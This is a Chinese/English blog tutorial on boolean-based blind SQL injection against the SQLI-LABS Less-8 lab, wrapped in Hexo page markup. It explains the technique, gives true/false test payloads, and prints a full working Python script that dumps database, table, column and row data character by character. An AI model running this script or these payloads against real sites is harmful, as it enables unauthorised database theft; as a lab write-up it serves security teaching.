@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- layout.ejs-->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="asdasdasasd">
+    <meta name="author" content="Asensio">
+    <meta name="keyword" content="hexo, hexo theme, A-RSnippet, responsive, bootstrap">
+    <link rel="canonical" href="http://yoursite.com/SQL注入-BLIND-Injections-Boolian-Based/">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="A-RSnippet&lt;br&gt;&lt;a href=&#34;https://github.com/huyingjie/hexo-theme-A-RSnippet&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Release-v0.1.0-red.svg&#34;&gt;&lt;/a&gt;" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
+
+    <title>
+        
+        SQL注入-BLIND Injections(Boolian Based)｜Asensio&#39;s Blog
+        
+    </title>
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="/css/main.css">
+
+    
+      <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+      <link rel="stylesheet" href="/css/highlight.css">
+    
+
+    
+      <script id="dsq-count-scr" src="//hexo-a-rsnippet.disqus.com/count.js" async></script>
+    
+
+
+    
+      <meta name="google-site-verification" content="g5BseDGQ1hWwdbBPJLKNfbC6xNOaM3X4LnKEMAvx_tI" />
+    
+
+    
+
+    
+
+
+    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-38355881-1', 'auto');
+    ga('send', 'pageview');
+</script>
+
+
+
+
+
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+
+    <!-- user customization -->
+    <link rel="stylesheet" href="/css/arsnippet.css">
+    <script src="/js/arsnippet.css.js"></script>
+</head>
+
+<style>
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<header>
+<!--
+  <nav class="navbar navbar-default header-navbar" id="nav-top" data-ispost = "true" data-istags="false" data-ishome = "false" >
+    <div class="container-fluid">
+      <div class="navbar-header page-scroll">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" aria-expanded="false"  data-target="#website_navbar">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <span class="navbar-brand animated pulse">
+          <a class="brand-logo" href="/">
+            A-RSnippet<br><a href="https://github.com/huyingjie/hexo-theme-A-RSnippet" target="_blank"><img src="https://img.shields.io/badge/Release-v0.1.0-red.svg"></a>
+          </a>
+        </span>
+      </div>
+
+      <div class="collapse navbar-collapse" id="website_navbar">
+          <ul class="nav navbar-nav navbar-right">
+              
+                <li>
+                  <a href="/">home</a>
+                </li>
+              
+                <li>
+                  <a href="/tutorial/">Tutorial</a>
+                </li>
+              
+                <li>
+                  <a href="/archives/">archives</a>
+                </li>
+              
+                <li>
+                  <a href="/categories/">categories</a>
+                </li>
+              
+                <li>
+                  <a href="/tags/">tags</a>
+                </li>
+              
+          </ul>
+      </div>
+  </nav>
+-->
+
+  
+    <style>
+       .intro-header {
+          background-image: url('/img/default_bg.png')          
+      }
+    </style>
+
+    <div class="intro-header">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                    <div class="site-heading">
+                        <a href="/" style="color:white"><h1>Asensio&#39;s Blog</h1></a>
+                        <div class="post-subtitle">asdasdasasd</div>
+                        
+                          <span class="meta">
+                               <span class="meta-item">Author: Asensio</span>
+                               <span class="meta-item">Date: Aug 25, 2017</span>
+                               
+                                 <span class="meta-item">Updated On: May 2, 2018</span>
+                               
+                          </span>
+                          <div class="tags text-center">
+                              Categories: 
+                              <a class="tag" href="/categories/#SQL注入"
+                                 title="SQL注入">SQL注入</a>
+                              
+                          </div>
+                          <div class="tags text-center">
+                              Tags: 
+                              <a class="tag" href="/tags/#SQL注入"
+                                 title="SQL注入">SQL注入</a>
+                              
+                              <a class="tag" href="/tags/#web安全"
+                                 title="web安全">web安全</a>
+                              
+                              <a class="tag" href="/tags/#盲住"
+                                 title="盲住">盲住</a>
+                              
+                          </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+  
+</header>
+
+
+<!-- Main Content -->
+<!-- post.ejs -->
+<article>
+    <div class="container">
+      <div class="col-lg-8 col-lg-offset-1 col-sm-9">
+          
+            <div class="text-center"><div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5272bc2a7b3c1ddc" async = "async" ></script>
+</div>
+</div><hr>
+          
+          <!---->
+	 <div style="font-size:18px" class="subscribe">SQL注入-BLIND Injections(Boolian Based)</div><p>
+          <h1 id="BLIND-INJECTIONS"><a href="#BLIND-INJECTIONS" class="headerlink" title="BLIND INJECTIONS"></a>BLIND INJECTIONS</h1><p>Continuing the SQLI-LABS series, we discussed the Error based injections, and discussed Union type injections and double query injections. In today’s post we would be discussing Blind injections. Blind injections got this name because during blind injections, you do not get any help from the application. All the errors are suppressed from the end user.<br>Therefore complete injection is based on a guess. The tester does not see any error responses to tune his  injections.<br>Blind Injections can be classified mainly into two categories:<br>    i.Boolean based Blind injections<br>    ii.Time based Blind injections.<br><a id="more"></a></p>
+<h1 id="Boolean-Based"><a href="#Boolean-Based" class="headerlink" title="Boolean Based"></a>Boolean Based</h1><p>As per wikipedia “In computer science, the Boolean or logical data type is a data type, having two values (usually denoted true and false), intended to represent the truth values of logic and Boolean algebra. It is named after George Boole, who first defined an algebraic system of logic in the mid 19th century”.Well in certain web applications, you can witness that the database does not write any fields on the web page or somehow union injections do not work, and the mysql errors are also not displayed on the page, so technically there is no direct channel through which the database writes on web page. In this case the only option left is to use blind injections. With Blind injections we cannot dump the strings or names directly but need to deduce names character by character.<br>In general when we were dealing with error based injections, we ask the database questions like, dump us the database name, version, table names etc. In case of blind injections, we change the way we ask questions to database and rephrase questions like is the first letter of the database this? and answer comes out as either yes or no or true or false. </p>
+<h1 id="Less-8-line-number"><a href="#Less-8-line-number" class="headerlink" title="Less-8 line number"></a>Less-8 line number</h1><p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br>basic injection example:<br>1’ AND ‘1’=’1 – returns true<br>1’ AND ‘1’=’0  – returns false<br>Therefore by evaluating the strings character by character we can dump the complete database.</p>
+<h1 id="盲注相关函数"><a href="#盲注相关函数" class="headerlink" title="盲注相关函数"></a>盲注相关函数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">length(str)：返回str字符串的长度。</span><br><span class="line">substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</span><br><span class="line">mid(str,pos,len):跟上面的一样，截取字符串</span><br><span class="line"> ascii(str)：返回字符串str的最左面字符的ASCII代码值。</span><br><span class="line">ord(str):同上，返回ascii码</span><br><span class="line">if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</span><br></pre></td></tr></table></figure>
+<h1 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success_str = <span class="string">"You are in"</span></span><br><span class="line">getTable = <span class="string">"users"</span></span><br><span class="line"></span><br><span class="line">index = <span class="string">"0"</span></span><br><span class="line">url = <span class="string">"http://localhost/sqli-labs/Less-8/?id=1"</span></span><br><span class="line">database = <span class="string">"database()"</span></span><br><span class="line">selectDB = <span class="string">"select database()"</span> </span><br><span class="line">selectTable = <span class="string">"select table_name from information_schema.tables where table_schema='%s' limit %d,1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">asciiPayload = <span class="string">"' and ascii(substr((%s),%d,1))&gt;=%d #"</span></span><br><span class="line">lengthPayload = <span class="string">"' and length(%s)&gt;=%d #"</span></span><br><span class="line">selectTableCountPayload = <span class="string">"'and (select count(table_name) from information_schema.tables where table_schema='%s')&gt;=%d #"</span></span><br><span class="line"></span><br><span class="line">selectTableNameLengthPayloadfront = <span class="string">"'and (select length(table_name) from information_schema.tables where table_schema='%s' limit "</span> </span><br><span class="line">selectTableNameLengthPayloadbehind = <span class="string">",1)&gt;=%d #"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求，根据页面的返回的判断长度的猜测结果</span></span><br><span class="line"><span class="comment"># string:猜测的字符串	payload:使用的payload	length：猜测的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLengthResult</span><span class="params">(payload, string, length)</span>:</span></span><br><span class="line">	finalUrl = url + urllib.quote(payload % (string, length))</span><br><span class="line">	res = urllib2.urlopen(finalUrl)</span><br><span class="line">	<span class="keyword">if</span> success_str <span class="keyword">in</span> res.read():</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求，根据页面的返回的判断猜测的字符是否正确</span></span><br><span class="line"><span class="comment"># payload:使用的payload	string:猜测的字符串	pos：猜测字符串的位置	ascii：猜测的ascii</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(payload, string, pos, ascii)</span>:</span></span><br><span class="line">	finalUrl = url + urllib.quote(payload % (string, pos, ascii))</span><br><span class="line">	res = urllib2.urlopen(finalUrl)</span><br><span class="line">	<span class="keyword">if</span> success_str <span class="keyword">in</span> res.read():</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="comment"># 猜数据库长度</span></span><br><span class="line">	lengthOfDBName = getLengthOfString(lengthPayload, database)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"length of DBname: "</span> + str(lengthOfDBName)</span><br><span class="line">	<span class="comment"># 获取数据库名称</span></span><br><span class="line">	DBname = getName(asciiPayload, selectDB, lengthOfDBName)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"current database:"</span> + DBname</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 获取数据库中的表的个数</span></span><br><span class="line">	<span class="comment"># print selectTableCountPayload</span></span><br><span class="line">	tableCount = getLengthOfString(selectTableCountPayload, DBname)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"count of talbe:"</span> + str(tableCount)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 获取数据库中的表</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,tableCount):</span><br><span class="line">		<span class="comment"># 第几个表</span></span><br><span class="line">		num = str(i)</span><br><span class="line">		<span class="comment"># 获取当前这个表的长度</span></span><br><span class="line">		selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind</span><br><span class="line">		tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"current table length:"</span> + str(tableNameLength)</span><br><span class="line">		<span class="comment"># 获取当前这个表的名字</span></span><br><span class="line">		selectTableName = selectTable%(DBname, i)</span><br><span class="line">		tableName = getName(asciiPayload, selectTableName ,tableNameLength)</span><br><span class="line">		<span class="keyword">print</span> tableName</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	selectColumnCountPayload = <span class="string">"'and (select count(column_name) from information_schema.columns where table_schema='"</span>+ DBname +<span class="string">"' and table_name='%s')&gt;=%d #"</span></span><br><span class="line">	<span class="comment"># print selectColumnCountPayload</span></span><br><span class="line">	<span class="comment"># 获取指定表的列的数量</span></span><br><span class="line">	columnCount = getLengthOfString(selectColumnCountPayload, getTable)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"table:"</span> + getTable + <span class="string">" --count of column:"</span> + str(columnCount)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 获取该表有多少行数据</span></span><br><span class="line">	dataCountPayload = <span class="string">"'and (select count(*) from %s)&gt;=%d #"</span></span><br><span class="line">	dataCount = getLengthOfString(dataCountPayload, getTable)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"table:"</span> + getTable + <span class="string">" --count of data: "</span> + str(dataCount)</span><br><span class="line"></span><br><span class="line">	data = []</span><br><span class="line">	<span class="comment"># 获取指定表中的列</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,columnCount):</span><br><span class="line">		<span class="comment"># 获取该列名字长度</span></span><br><span class="line">		selectColumnNameLengthPayload = <span class="string">"'and (select length(column_name) from information_schema.columns where table_schema='"</span>+ DBname +<span class="string">"' and table_name='%s' limit "</span>+ str(i) +<span class="string">",1)&gt;=%d #"</span></span><br><span class="line">		<span class="comment"># print selectColumnNameLengthPayload</span></span><br><span class="line">		columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"current column length:"</span> + str(columnNameLength)</span><br><span class="line">		<span class="comment"># 获取该列的名字</span></span><br><span class="line">		selectColumn = <span class="string">"select column_name from information_schema.columns where table_schema='"</span>+ DBname +<span class="string">"' and table_name='%s' limit %d,1"</span></span><br><span class="line">		selectColumnName = selectColumn%(getTable, i)</span><br><span class="line">		<span class="comment"># print selectColumnName</span></span><br><span class="line">		columnName = getName(asciiPayload, selectColumnName ,columnNameLength)</span><br><span class="line">		<span class="keyword">print</span> columnName</span><br><span class="line"></span><br><span class="line">		tmpData = []</span><br><span class="line">		tmpData.append(columnName)</span><br><span class="line">		<span class="comment"># 获取该表的数据</span></span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,dataCount):</span><br><span class="line">			columnDataLengthPayload = <span class="string">"'and (select length("</span>+ columnName +<span class="string">") from %s limit "</span> + str(j) + <span class="string">",1)&gt;=%d #"</span></span><br><span class="line">			<span class="comment"># print columnDataLengthPayload</span></span><br><span class="line">			columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)</span><br><span class="line">			<span class="comment"># print columnDataLength</span></span><br><span class="line">			selectData = <span class="string">"select "</span> + columnName + <span class="string">" from users limit "</span> + str(j) + <span class="string">",1"</span></span><br><span class="line">			columnData = getName(asciiPayload, selectData, columnDataLength)</span><br><span class="line">			<span class="comment"># print columnData</span></span><br><span class="line">			tmpData.append(columnData)</span><br><span class="line">	</span><br><span class="line">		data.append(tmpData)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># print data	</span></span><br><span class="line">	<span class="comment"># 格式化输出数据</span></span><br><span class="line">	<span class="comment"># 输出列名</span></span><br><span class="line">	tmp = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(data)):</span><br><span class="line">		tmp += data[i][<span class="number">0</span>] + <span class="string">"	"</span></span><br><span class="line">	<span class="keyword">print</span> tmp</span><br><span class="line">	<span class="comment"># 输出具体数据</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">1</span>,dataCount+<span class="number">1</span>):</span><br><span class="line">		tmp = <span class="string">""</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,len(data)):</span><br><span class="line">			tmp += data[i][j] + <span class="string">"	"</span></span><br><span class="line">		<span class="keyword">print</span> tmp</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 获取字符串的长度			</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLengthOfString</span><span class="params">(payload, string)</span>:</span></span><br><span class="line">	<span class="comment"># 猜长度</span></span><br><span class="line">	lengthLeft = <span class="number">0</span></span><br><span class="line">	lengthRigth = <span class="number">0</span></span><br><span class="line">	guess = <span class="number">10</span></span><br><span class="line">	<span class="comment"># 确定长度上限，每次增加5</span></span><br><span class="line">	<span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">		<span class="comment"># 如果长度大于guess</span></span><br><span class="line">		<span class="keyword">if</span> getLengthResult(payload, string, guess) == <span class="keyword">True</span>:</span><br><span class="line">			<span class="comment"># 猜测值增加5</span></span><br><span class="line">			guess = guess + <span class="number">5</span>	</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			lengthRigth = guess</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="comment"># print "lengthRigth: " + str(lengthRigth)</span></span><br><span class="line">	<span class="comment"># 二分法查长度</span></span><br><span class="line">	mid = (lengthLeft + lengthRigth) / <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> lengthLeft &lt; lengthRigth - <span class="number">1</span>:</span><br><span class="line">		<span class="comment"># 如果长度大于等于mid </span></span><br><span class="line">		<span class="keyword">if</span> getLengthResult(payload, string, mid) == <span class="keyword">True</span>:</span><br><span class="line">			<span class="comment"># 更新长度的左边界为mid</span></span><br><span class="line">			lengthLeft = mid</span><br><span class="line">		<span class="keyword">else</span>: </span><br><span class="line">		<span class="comment"># 否则就是长度小于mid</span></span><br><span class="line">			<span class="comment"># 更新长度的右边界为mid</span></span><br><span class="line">			lengthRigth = mid</span><br><span class="line">		<span class="comment"># 更新中值</span></span><br><span class="line">		mid = (lengthLeft + lengthRigth) / <span class="number">2</span>		</span><br><span class="line">		<span class="comment"># print lengthLeft, lengthRigth</span></span><br><span class="line">	<span class="comment"># 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid</span></span><br><span class="line">	<span class="comment"># 所以长度区间：大于等于 lengthLeft，小于lengthRigth</span></span><br><span class="line">	<span class="comment"># 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度</span></span><br><span class="line">	<span class="comment"># 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8</span></span><br><span class="line">	<span class="keyword">return</span> lengthLeft</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取名称</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getName</span><span class="params">(payload, string, lengthOfString)</span>:</span></span><br><span class="line">	<span class="comment"># 32是空格，是第一个可显示的字符，127是delete，最后一个字符</span></span><br><span class="line">	tmp = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,lengthOfString+<span class="number">1</span>):</span><br><span class="line">		left = <span class="number">32</span> </span><br><span class="line">		right = <span class="number">127</span></span><br><span class="line">		mid = (left + right) / <span class="number">2</span></span><br><span class="line">		<span class="keyword">while</span> left &lt; right - <span class="number">1</span>:</span><br><span class="line">			<span class="comment"># 如果该字符串的第i个字符的ascii码大于等于mid</span></span><br><span class="line">			<span class="keyword">if</span> getResult(payload, string, i, mid) == <span class="keyword">True</span>:</span><br><span class="line">				<span class="comment"># 则更新左边界</span></span><br><span class="line">				left = mid</span><br><span class="line">				mid = (left + right) / <span class="number">2</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment"># 否则该字符串的第i个字符的ascii码小于mid</span></span><br><span class="line">				<span class="comment"># 则更新右边界</span></span><br><span class="line">				right = mid</span><br><span class="line">			<span class="comment"># 更新中值</span></span><br><span class="line">			mid = (left + right) / <span class="number">2</span></span><br><span class="line">		tmp += chr(left)</span><br><span class="line">		<span class="comment"># print tmp</span></span><br><span class="line">	<span class="keyword">return</span> tmp	</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	inject()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+          
+            <a href="https://www.patreon.com/arsnippet" target="_blank"><img src="/img/patreon.png" alt="support my work at patron"> <a href="https://discord.gg/CB6CPzq" target="_blank"><img src="/img/discord.png" alt="Join the Discord"></a> <br><br><a href="https://arsnippet.freeflarum.com/" target="_blank"><img src="/img/forum.jpg" alt="support my work at patron"></a>
+          
+          <hr>
+          <ul class="pager">
+              
+              <li class="previous">
+                  <a href="/SQL注入-Blind-injection-time-based/" data-toggle="tooltip" data-placement="left"
+                     title="SQL注入-Blind injection time-based">&larr; Previous Post</a>
+              </li>
+              
+              
+              <li class="next">
+                  <a href="/SQL注入-双查询注入/" data-toggle="tooltip" data-placement="top"
+                     title="SQL注入-Error Based Injections (Double Injection Based)">Next Post&rarr;</a>
+              </li>
+              
+          </ul>
+        
+  <br>
+  
+  <!-- disqus start -->
+  <div class="comment">
+    <div id="disqus_thread"  class="disqus-thread"></div>
+      <script>
+      var disqus_shortname = 'hexo-a-rsnippet';
+      
+      var disqus_url = 'http://yoursite.com/SQL注入-BLIND-Injections-Boolian-Based/';
+      
+      (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+  <!-- disqus end -->
+  
+
+  
+  </div>
+
+
+        
+  <div class="hidden-xs col-sm-3 toc-col">
+    <div class="toc-wrap">
+        Table of Contents
+        
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BLIND-INJECTIONS"><span class="toc-number">1.</span> <span class="toc-text">BLIND INJECTIONS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Boolean-Based"><span class="toc-number">2.</span> <span class="toc-text">Boolean Based</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-8-line-number"><span class="toc-number">3.</span> <span class="toc-text">Less-8 line number</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#盲注相关函数"><span class="toc-number">4.</span> <span class="toc-text">盲注相关函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#python脚本"><span class="toc-number">5.</span> <span class="toc-text">python脚本</span></a></li></ol>
+        
+    </div>
+  </div>
+
+
+      </div>
+  </div>
+</article>
+
+<!-- Footer -->
+<!-- footer.ejs -->
+<footer>
+    <div class="text-center">
+      <ul class="list-inline">
+          
+              <li>
+                  <a href="/atom.xml" target="_blank">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+          
+          
+
+          
+              <li>
+                  <a target="_blank" href="http://weibo.com/u/2911633817">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+          
+
+          
